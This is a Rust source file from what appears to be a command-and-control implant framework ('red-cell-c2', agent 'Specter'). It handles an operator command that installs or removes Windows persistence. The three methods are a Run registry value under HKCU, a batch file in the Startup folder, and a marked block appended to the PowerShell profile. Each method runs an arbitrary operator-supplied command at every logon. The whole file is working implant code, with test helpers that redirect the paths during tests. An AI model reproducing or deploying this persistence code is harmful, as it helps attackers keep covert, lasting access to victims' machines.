//! Persistence mechanism install/remove handlers.

use std::path::{Path, PathBuf};

use red_cell_common::demon::PhantomPersistOp;
use tracing::warn;

use super::{
    DispatchResult, error_output_response, parse_bytes_le, parse_u32_le, text_output_response,
};

// ─── COMMAND_PERSIST (3000) ─────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) enum SpecterPersistMethod {
    RegistryRunKey = 1,
    StartupFolder = 2,
    PowerShellProfile = 3,
}

impl TryFrom<u32> for SpecterPersistMethod {
    type Error = &'static str;

    fn try_from(value: u32) -> Result<Self, Self::Error> {
        match value {
            1 => Ok(Self::RegistryRunKey),
            2 => Ok(Self::StartupFolder),
            3 => Ok(Self::PowerShellProfile),
            _ => Err("unknown Specter persist method"),
        }
    }
}

pub(super) const SPECTER_PERSIST_MARKER: &str = "# red-cell-c2:specter";
#[cfg(any(windows, test))]
pub(super) const SPECTER_RUN_VALUE_NAME: &str = "RedCellC2";
#[cfg(any(windows, test))]
pub(super) const SPECTER_STARTUP_FILE_NAME: &str = "RedCellC2.cmd";

#[derive(Debug, Clone)]
struct PersistPaths {
    registry_run_value: PathBuf,
    startup_script: PathBuf,
    powershell_profile: PathBuf,
}

/// Handle `CommandPersist` (ID 3000): install or remove a Windows persistence mechanism.
///
/// Incoming payload (LE):
/// `[method: u32][op: u32][command: bytes?]`
///
/// The `command` field is a UTF-8 length-prefixed byte string and is only present for
/// install requests. Success emits `CommandOutput`; failures emit `BeaconOutput /
/// ErrorMessage`, mirroring how the teamserver surfaces operator task output.
pub(super) fn handle_persist(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;

    let method_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandPersist: failed to parse method: {e}");
            return DispatchResult::Ignore;
        }
    };

    let op_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandPersist: failed to parse operation: {e}");
            return DispatchResult::Ignore;
        }
    };

    let method = match SpecterPersistMethod::try_from(method_raw) {
        Ok(v) => v,
        Err(_) => {
            return error_output_response(&format!("unknown Specter persist method {method_raw}"));
        }
    };

    let op = match PhantomPersistOp::try_from(op_raw) {
        Ok(v) => v,
        Err(_) => {
            return error_output_response(&format!("unknown Specter persist operation {op_raw}"));
        }
    };

    let command = match op {
        PhantomPersistOp::Install => match parse_bytes_le(payload, &mut offset) {
            Ok(bytes) => {
                let text = String::from_utf8_lossy(&bytes).trim().to_string();
                if text.is_empty() {
                    return error_output_response(
                        "Specter persist install command cannot be empty",
                    );
                }
                text
            }
            Err(e) => {
                warn!("CommandPersist: failed to parse install command: {e}");
                return DispatchResult::Ignore;
            }
        },
        PhantomPersistOp::Remove => String::new(),
    };

    let result = match method {
        SpecterPersistMethod::RegistryRunKey => persist_registry_run_key(op, &command),
        SpecterPersistMethod::StartupFolder => persist_startup_folder(op, &command),
        SpecterPersistMethod::PowerShellProfile => persist_powershell_profile(op, &command),
    };

    match result {
        Ok(message) => text_output_response(&message),
        Err(message) => error_output_response(&message),
    }
}

fn persist_registry_run_key(op: PhantomPersistOp, command: &str) -> Result<String, String> {
    match persist_registry_run_key_impl(op, command) {
        Ok(message) => Ok(message),
        Err(message) => Err(format!("registry run key persistence failed: {message}")),
    }
}

fn persist_startup_folder(op: PhantomPersistOp, command: &str) -> Result<String, String> {
    let paths = persist_paths()?;
    let script_path = paths.startup_script;

    match op {
        PhantomPersistOp::Install => {
            if let Some(existing) = read_existing_text(&script_path)? {
                if existing == startup_script_contents(command) {
                    return Ok(format!(
                        "startup folder persistence already present at {}",
                        script_path.display()
                    ));
                }
            }

            write_text_file(&script_path, &startup_script_contents(command))?;
            Ok(format!("startup folder persistence installed at {}", script_path.display()))
        }
        PhantomPersistOp::Remove => {
            if !script_path.exists() {
                return Ok(format!(
                    "startup folder persistence not found at {}",
                    script_path.display()
                ));
            }
            std::fs::remove_file(&script_path)
                .map_err(|e| format!("remove {}: {e}", script_path.display()))?;
            Ok(format!("startup folder persistence removed from {}", script_path.display()))
        }
    }
}

fn persist_powershell_profile(op: PhantomPersistOp, command: &str) -> Result<String, String> {
    let paths = persist_paths()?;
    let profile_path = paths.powershell_profile;
    let begin_marker = format!("# BEGIN {SPECTER_PERSIST_MARKER}");
    let end_marker = format!("# END {SPECTER_PERSIST_MARKER}");

    let existing = read_existing_text(&profile_path)?.unwrap_or_default();

    match op {
        PhantomPersistOp::Install => {
            if existing.contains(&begin_marker) {
                let stored = extract_delimited_command(&existing, &begin_marker, &end_marker);
                if stored.as_deref() == Some(command) {
                    return Ok(format!(
                        "PowerShell profile persistence already present at {}",
                        profile_path.display()
                    ));
                }
                // Command changed — replace the existing block.
                let without_block = remove_delimited_block(&existing, &begin_marker, &end_marker);
                let block = format!("\n{begin_marker}\n{command}\n{end_marker}\n");
                write_text_file(&profile_path, &format!("{without_block}{block}"))?;
                return Ok(format!(
                    "PowerShell profile persistence updated at {}",
                    profile_path.display()
                ));
            }

            let block = format!("\n{begin_marker}\n{command}\n{end_marker}\n");
            write_text_file(&profile_path, &format!("{existing}{block}"))?;
            Ok(format!("PowerShell profile persistence installed at {}", profile_path.display()))
        }
        PhantomPersistOp::Remove => {
            if !existing.contains(&begin_marker) {
                return Ok(format!(
                    "PowerShell profile persistence not found at {}",
                    profile_path.display()
                ));
            }

            let new_content = remove_delimited_block(&existing, &begin_marker, &end_marker);
            write_text_file(&profile_path, &new_content)?;
            Ok(format!("PowerShell profile persistence removed from {}", profile_path.display()))
        }
    }
}

fn startup_script_contents(command: &str) -> String {
    format!("@echo off\r\n{command}\r\n")
}

fn remove_delimited_block(text: &str, begin: &str, end: &str) -> String {
    let mut result = String::with_capacity(text.len());
    let mut inside = false;

    for line in text.lines() {
        if line.trim() == begin {
            inside = true;
            continue;
        }
        if inside {
            if line.trim() == end {
                inside = false;
            }
            continue;
        }
        result.push_str(line);
        result.push('\n');
    }

    result
}

/// Returns the content between `begin` and `end` marker lines (exclusive), joined with `\n`.
/// Returns `None` when the begin marker is not found.
fn extract_delimited_command(text: &str, begin: &str, end: &str) -> Option<String> {
    let mut inside = false;
    let mut lines: Vec<&str> = Vec::new();

    for line in text.lines() {
        if line.trim() == begin {
            inside = true;
            continue;
        }
        if inside {
            if line.trim() == end {
                break;
            }
            lines.push(line);
        }
    }

    if inside || !lines.is_empty() { Some(lines.join("\n")) } else { None }
}

fn read_existing_text(path: &Path) -> Result<Option<String>, String> {
    if !path.exists() {
        return Ok(None);
    }
    std::fs::read_to_string(path).map(Some).map_err(|e| format!("read {}: {e}", path.display()))
}

pub(super) fn write_text_file(path: &Path, contents: &str) -> Result<(), String> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|e| format!("create {}: {e}", parent.display()))?;
    }
    std::fs::write(path, contents).map_err(|e| format!("write {}: {e}", path.display()))
}

fn persist_paths() -> Result<PersistPaths, String> {
    #[cfg(test)]
    if let Some(paths) = test_persist_paths_override() {
        return Ok(paths);
    }

    #[cfg(windows)]
    {
        let appdata = std::env::var_os("APPDATA").ok_or_else(|| "APPDATA not set".to_string())?;
        let userprofile =
            std::env::var_os("USERPROFILE").ok_or_else(|| "USERPROFILE not set".to_string())?;

        let startup_script = PathBuf::from(&appdata)
            .join("Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            .join(SPECTER_STARTUP_FILE_NAME);
        let powershell_profile = PathBuf::from(&userprofile)
            .join("Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1");

        return Ok(PersistPaths {
            registry_run_value: PathBuf::from(format!(
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{SPECTER_RUN_VALUE_NAME}"
            )),
            startup_script,
            powershell_profile,
        });
    }

    #[cfg(not(windows))]
    {
        Err("CommandPersist is only available on Windows builds".to_string())
    }
}

#[cfg(windows)]
#[allow(unsafe_code)]
fn persist_registry_run_key_impl(op: PhantomPersistOp, command: &str) -> Result<String, String> {
    use windows_sys::Win32::Foundation::ERROR_FILE_NOT_FOUND;
    use windows_sys::Win32::System::Registry::{
        HKEY, HKEY_CURRENT_USER, KEY_SET_VALUE, KEY_WOW64_64KEY, KEY_WRITE,
        REG_OPTION_NON_VOLATILE, REG_SZ, RRF_RT_REG_SZ, RegCloseKey, RegCreateKeyExW,
        RegDeleteValueW, RegGetValueW, RegSetValueExW,
    };

    let subkey: Vec<u16> =
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".encode_utf16().collect();
    let value_name: Vec<u16> = format!("{SPECTER_RUN_VALUE_NAME}\0").encode_utf16().collect();

    let mut key: HKEY = core::ptr::null_mut();
    let status = unsafe {
        RegCreateKeyExW(
            HKEY_CURRENT_USER,
            subkey.as_ptr(),
            0,
            core::ptr::null_mut(),
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE | KEY_SET_VALUE | KEY_WOW64_64KEY,
            core::ptr::null(),
            &mut key,
            core::ptr::null_mut(),
        )
    };
    if status != 0 {
        return Err(format!("RegCreateKeyExW failed with {status}"));
    }

    fn query_registry_string(key: HKEY, value_name: &[u16]) -> Result<Option<String>, String> {
        let mut required = 0u32;
        let status = unsafe {
            RegGetValueW(
                key,
                core::ptr::null(),
                value_name.as_ptr(),
                RRF_RT_REG_SZ,
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                &mut required,
            )
        };

        if status == ERROR_FILE_NOT_FOUND {
            return Ok(None);
        }
        if status != 0 {
            return Err(format!("RegGetValueW(size) failed with {status}"));
        }

        let mut buffer = vec![0u8; required as usize];
        let status = unsafe {
            RegGetValueW(
                key,
                core::ptr::null(),
                value_name.as_ptr(),
                RRF_RT_REG_SZ,
                core::ptr::null_mut(),
                buffer.as_mut_ptr().cast(),
                &mut required,
            )
        };
        if status != 0 {
            return Err(format!("RegGetValueW(data) failed with {status}"));
        }

        let utf16: Vec<u16> =
            buffer.chunks_exact(2).map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]])).collect();
        Ok(Some(String::from_utf16_lossy(&utf16).trim_end_matches('\0').to_string()))
    }

    fn set_registry_string(key: HKEY, value_name: &[u16], value: &str) -> Result<(), String> {
        let data: Vec<u16> = value.encode_utf16().chain(std::iter::once(0)).collect();
        let bytes = data
            .len()
            .checked_mul(2)
            .ok_or_else(|| "registry string length overflow".to_string())?;
        let bytes = u32::try_from(bytes).map_err(|_| "registry string too large".to_string())?;
        let status = unsafe {
            RegSetValueExW(key, value_name.as_ptr(), 0, REG_SZ, data.as_ptr().cast(), bytes)
        };
        if status == 0 { Ok(()) } else { Err(format!("RegSetValueExW failed with {status}")) }
    }

    let result = match op {
        PhantomPersistOp::Install => {
            if let Some(existing) = query_registry_string(key, &value_name)? {
                if existing == command {
                    Ok(format!(
                        "registry run key persistence already present at {}",
                        persist_paths()?.registry_run_value.display()
                    ))
                } else {
                    set_registry_string(key, &value_name, command)?;
                    Ok(format!(
                        "registry run key persistence updated at {}",
                        persist_paths()?.registry_run_value.display()
                    ))
                }
            } else {
                set_registry_string(key, &value_name, command)?;
                Ok(format!(
                    "registry run key persistence installed at {}",
                    persist_paths()?.registry_run_value.display()
                ))
            }
        }
        PhantomPersistOp::Remove => {
            let delete_status = unsafe { RegDeleteValueW(key, value_name.as_ptr()) };
            if delete_status == 0 {
                Ok(format!(
                    "registry run key persistence removed from {}",
                    persist_paths()?.registry_run_value.display()
                ))
            } else if delete_status == ERROR_FILE_NOT_FOUND {
                Ok(format!(
                    "registry run key persistence not found at {}",
                    persist_paths()?.registry_run_value.display()
                ))
            } else {
                Err(format!("RegDeleteValueW failed with {delete_status}"))
            }
        }
    };

    unsafe { RegCloseKey(key) };
    result
}

#[cfg(not(windows))]
fn persist_registry_run_key_impl(op: PhantomPersistOp, command: &str) -> Result<String, String> {
    let paths = persist_paths()?;
    let value_path = paths.registry_run_value;

    match op {
        PhantomPersistOp::Install => {
            if let Some(existing) = read_existing_text(&value_path)? {
                if existing == command {
                    return Ok(format!(
                        "registry run key persistence already present at {}",
                        value_path.display()
                    ));
                }
            }
            write_text_file(&value_path, command)?;
            Ok(format!("registry run key persistence installed at {}", value_path.display()))
        }
        PhantomPersistOp::Remove => {
            if !value_path.exists() {
                return Ok(format!(
                    "registry run key persistence not found at {}",
                    value_path.display()
                ));
            }
            std::fs::remove_file(&value_path)
                .map_err(|e| format!("remove {}: {e}", value_path.display()))?;
            Ok(format!("registry run key persistence removed from {}", value_path.display()))
        }
    }
}

#[cfg(test)]
#[derive(Clone, Debug)]
pub(super) struct TestPersistPaths {
    paths: PersistPaths,
}

#[cfg(test)]
static TEST_PERSIST_PATHS: std::sync::OnceLock<std::sync::Mutex<Option<TestPersistPaths>>> =
    std::sync::OnceLock::new();

#[cfg(test)]
static TEST_PERSIST_LOCK: std::sync::OnceLock<std::sync::Mutex<()>> = std::sync::OnceLock::new();

#[cfg(test)]
fn test_persist_paths_override() -> Option<PersistPaths> {
    TEST_PERSIST_PATHS
        .get_or_init(|| std::sync::Mutex::new(None))
        .lock()
        .expect("test persist paths mutex poisoned")
        .as_ref()
        .map(|value| value.paths.clone())
}

#[cfg(test)]
pub(super) struct TestPersistGuard {
    _lock: std::sync::MutexGuard<'static, ()>,
}

#[cfg(test)]
impl TestPersistGuard {
    pub(super) fn install(base: &Path) -> Self {
        let lock = TEST_PERSIST_LOCK
            .get_or_init(|| std::sync::Mutex::new(()))
            .lock()
            .expect("test persist lock poisoned");
        let paths = PersistPaths {
            registry_run_value: base.join("registry").join(SPECTER_RUN_VALUE_NAME),
            startup_script: base.join("startup").join(SPECTER_STARTUP_FILE_NAME),
            powershell_profile: base.join("powershell").join("Microsoft.PowerShell_profile.ps1"),
        };
        *TEST_PERSIST_PATHS
            .get_or_init(|| std::sync::Mutex::new(None))
            .lock()
            .expect("test persist paths mutex poisoned") = Some(TestPersistPaths { paths });
        Self { _lock: lock }
    }
}

#[cfg(test)]
impl Drop for TestPersistGuard {
    fn drop(&mut self) {
        *TEST_PERSIST_PATHS
            .get_or_init(|| std::sync::Mutex::new(None))
            .lock()
            .expect("test persist paths mutex poisoned") = None;
    }
}
